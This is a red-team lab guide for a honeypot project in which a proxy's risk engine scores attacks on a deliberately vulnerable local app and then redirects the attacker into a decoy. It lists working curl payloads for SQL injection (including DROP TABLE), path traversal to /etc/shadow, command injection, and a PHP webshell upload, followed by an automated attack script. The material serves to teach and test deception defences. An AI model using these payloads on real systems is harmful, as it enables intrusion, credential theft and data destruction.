# Attack the Real System → Trigger Honeypot Redirect

> **Red-team exercise guide.**  
> The `real-app` service exposes 6 deliberately vulnerable endpoints.  
> Every exploit attempt logs a `[VULN:TAG]` event and adds to your IP's Lua risk score.  
> Once the score reaches **100**, the proxy silently redirects ALL your traffic into the honeypot — forever.

---

## Architecture

```
                         ┌─────────────────────┐
You (attacker) ──port 80─► proxy (risk engine)  ├─── score < 100 ──► real-app (10.0.0.2:8080)
                         │ risk_engine.lua       ├─── score ≥ 100 ──► honeypot (10.0.0.3:8001)
                         └─────────────────────┘
                                                          ▲
                                                  IP gate: only score ≥ 100
                                                  gets past — others get 404
```

Target the **proxy on port 80** — going directly to `:8080` bypasses risk scoring.

---

## The 6 Vulnerable Endpoints

Every hit logs a `[VULN:TAG]` line to `real_app.log` and adds points to your IP's risk score.

| # | Route | Vulnerability | Log Tag | Points |
|---|-------|--------------|---------|--------|
| 1 | `GET /api/search?q=<payload>` | SQL Injection | `[VULN:SQLI]` | **+20** |
| 2 | `GET /api/files?path=<payload>` | Path Traversal | `[VULN:PATH_TRAVERSAL]` | **+25** |
| 3 | `GET /api/admin/users` | Admin Enumeration | `[VULN:ADMIN_ENUM]` | **+20** |
| 4 | `POST /api/execute` body `{"cmd":"..."}` | Command Injection | `[VULN:CMD_INJECTION]` | **+40** |
| 5 | `POST /api/upload` with webshell `.php` | Webshell Upload | `[VULN:WEBSHELL_UPLOAD]` | **+40** |
| 6 | `GET /api/account?id=<id>` | IDOR | `[VULN:IDOR]` | **+10** |

---

## Attack Walkthroughs

### 1 — SQL Injection (+20 pts)

```bash
# Classic OR bypass
curl "http://localhost/api/search?q=1' OR '1'='1"

# UNION-based
curl "http://localhost/api/search?q=1 UNION SELECT username,password FROM users--"

# Stacked queries
curl "http://localhost/api/search?q=1; DROP TABLE users--"
```

Expected response: `{"results": [...], "query": "...", "vulnerable": true}`  
Dashboard log: `🗄️ SQL Injection +20`

---

### 2 — Path Traversal (+25 pts)

```bash
# Classic dot-dot
curl "http://localhost/api/files?path=../../../../etc/passwd"

# URL-encoded
curl "http://localhost/api/files?path=%2e%2e%2f%2e%2e%2fetc%2fshadow"

# Windows path
curl "http://localhost/api/files?path=..\..\..\..\windows\system32\drivers\etc\hosts"
```

Expected response: fake file content with `"path_traversal_detected": true`  
Dashboard log: `📂 Path Traversal +25`

---

### 3 — Admin Enumeration (+20 pts)

```bash
# Direct admin access — no auth required
curl "http://localhost/api/admin/users"

# Also triggers ADMIN_ENUM via the proxy for these paths:
curl "http://localhost/admin"
curl "http://localhost/.env"
curl "http://localhost/.git/config"
```

Expected response: fake user list JSON with admin credentials embedded  
Dashboard log: `🛡️ Admin Enumeration +20`

---

### 4 — Command Injection (+40 pts)

```bash
# Semicolon chaining
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"whoami;id"}' \
  http://localhost/api/execute

# Pipe
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"ls | grep passwd"}' \
  http://localhost/api/execute

# Backtick injection
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"`cat /etc/shadow`"}' \
  http://localhost/api/execute
```

Expected response: fake command output with `"command_injection_detected": true`  
Dashboard log: `💻 Command Injection +40`

---

### 5 — Webshell Upload (+40 pts)

```bash
# Create a PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via real-app upload endpoint
curl -X POST \
  -F "file=@shell.php;filename=shell.php" \
  http://localhost/api/upload
```

Expected response: `{"status": "uploaded", "filename": "shell.php", "webshell_detected": true}`  
Dashboard log: `☠️ Webshell Upload +40`

> **Note:** The real-app upload endpoint is intentionally vulnerable for red-team practice.  
> The honeypot's CVE-2020-36179 trap (separate endpoint) is the real deception layer.

---

### 6 — IDOR (+10 pts)

```bash
# Access another user's account
curl "http://localhost/api/account?id=1"
curl "http://localhost/api/account?id=9999"

# Admin account ID
curl "http://localhost/api/account?id=0"
```

Expected response: fake account data with `"idor_detected": true`  
Dashboard log: `🔑 IDOR +10`

---

## Minimum Paths to 100 Points

### Fast Path (2 requests)
```bash
# Webshell upload (40) + Command Injection (40) + Path Traversal (25) = 105 ✅
curl -X POST -F "file=@shell.php" http://localhost/api/upload
curl -X POST -H "Content-Type: application/json" -d '{"cmd":"whoami;id"}' http://localhost/api/execute
curl "http://localhost/api/files?path=../../../../etc/passwd"
```

### Stealth Path (6 requests — spread across vuln types)
```bash
curl "http://localhost/api/search?q=1 OR 1=1"          # +20 → 20
curl "http://localhost/api/files?path=../../etc/passwd" # +25 → 45
curl "http://localhost/api/admin/users"                 # +20 → 65
curl "http://localhost/api/account?id=9999"             # +10 → 75
curl -X POST -d '{"cmd":"id"}' http://localhost/api/execute  # +40 → 115 ✅
```

---

## Full Automated Attack Script

```bash
#!/bin/bash
# maze-myth-attack.sh — automated real-app exploit chain
HOST="http://localhost"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Maze Myth — Real-App Attack Chain"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo -e "\n[1] SQL Injection (+20 pts)..."
curl -s "$HOST/api/search?q=1' OR '1'='1" | python3 -m json.tool 2>/dev/null || echo "  → response received"

echo -e "\n[2] Path Traversal (+25 pts)..."
curl -s "$HOST/api/files?path=../../../../etc/passwd" | python3 -m json.tool 2>/dev/null || echo "  → response received"

echo -e "\n[3] Admin Enumeration (+20 pts)..."
curl -s "$HOST/api/admin/users" | python3 -m json.tool 2>/dev/null || echo "  → response received"

echo -e "\n[4] IDOR (+10 pts)..."
curl -s "$HOST/api/account?id=9999" | python3 -m json.tool 2>/dev/null || echo "  → response received"

echo -e "\n[5] Command Injection (+40 pts) — TOTAL ≥ 115..."
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"cmd":"whoami;id;hostname"}' "$HOST/api/execute" | python3 -m json.tool 2>/dev/null || echo "  → response received"

echo -e "\n[6] Testing if redirect fired..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" "$HOST/api/v1/accounts")
if [ "$RESP" == "200" ]; then
  echo "  → Honeypot active! Response from honeypot API maze ✅"
else
  echo "  → HTTP $RESP — still on real-app"
fi

echo -e "\n[7] Dashboard attack monitor..."
curl -s "$HOST:8002/api/real/attacks" | python3 -m json.tool 2>/dev/null | head -40

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Done — check http://localhost:8002 → REAL-APP ATTACKS tab"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
```

---

## Monitor Your Attack in Real-Time

### Option A — Dashboard UI

Open **http://localhost:8002** → click **"REAL-APP ATTACKS"** tab.

You'll see:

- **Risk Score Leaderboard** — your IP with an animated score bar:
  - 🟢 0–39 pts — `low`
  - 🟡 40–74 pts — `med`
  - 🟠 75–99 pts — `high`
  - 🔴 ≥100 pts — `danger` + **REDIRECTED** badge

- **Live Exploit Feed** — every event as you send it:
  ```
  08:12:34  🗄️ SQL Injection   +20  ∑20   10.0.0.1   1' OR '1'='1
  08:12:35  📂 Path Traversal  +25  ∑45   10.0.0.1   ../../../../etc/passwd
  08:12:36  🛡️ Admin Enum      +20  ∑65   10.0.0.1
  08:12:37  🔑 IDOR            +10  ∑75   10.0.0.1   id=9999
  08:12:38  💻 Cmd Injection   +40  ∑115  10.0.0.1   whoami;id
  🔴 REDIRECT TRIGGERED — 10.0.0.1 crossed 100 pts (cumulative: 115)
  ```

### Option B — Raw JSON API

```bash
curl http://localhost:8002/api/real/attacks | python3 -m json.tool
```

Fields:
- `total_events` — total exploit events seen
- `unique_attackers` — number of distinct IPs
- `redirected_ips` — IPs that crossed 100 pts
- `attacker_profiles` — per-IP `{score, hits, tags, redirected, last_seen}`
- `events` — latest 100 events with `{timestamp, ip, tag, label, points, cumulative_score, redirected_at_this_point}`

---

## Honeypot IP Gate

After redirect, the honeypot enforces an IP gate:

```
Request from your IP → honeypot_gate() checks:
  ✅ X-Risk-Score >= 100  →  enter (first redirect)
  ✅ IP was already approved  →  enter (returning)
  ✅ Loopback  →  enter (health check)
  ✅ /api/dashboard/* from internal net  →  enter (dashboard)
  ❌ Everything else  →  404 Not Found (invisible)
```

Low-risk IPs trying to reach port 8001 directly always get `404`. The honeypot is completely invisible to them.

---

## What Happens After Redirect

Once inside the honeypot:

1. **API Maze** — every URL returns realistic banking JSON (Gemini-generated, consistent per session)
2. **CVE-2020-36179 trap** — upload forms at `/clientportal/support/attachments.php` and `/api/v2/documents/compliance-upload`
3. **Shell RAG** — webshell `?cmd=` responds with AI-generated realistic Linux output
4. **Bait files** — downloads embed unique beacon IDs
5. **Full attacker profiling** — visible in the **ATTACKERS** tab at http://localhost:8002

---

## Notes

- Use the **proxy on port 80** — `http://localhost:8001` direct access bypasses the gate
- Risk scores are per-IP, cumulative, and sticky for 24 hours after redirect
- The `deception-net` Docker network isolates all services — real-app is never directly reachable from outside
- Run `docker compose logs -f vm1-proxy` to see real-time redirect events from the Lua engine
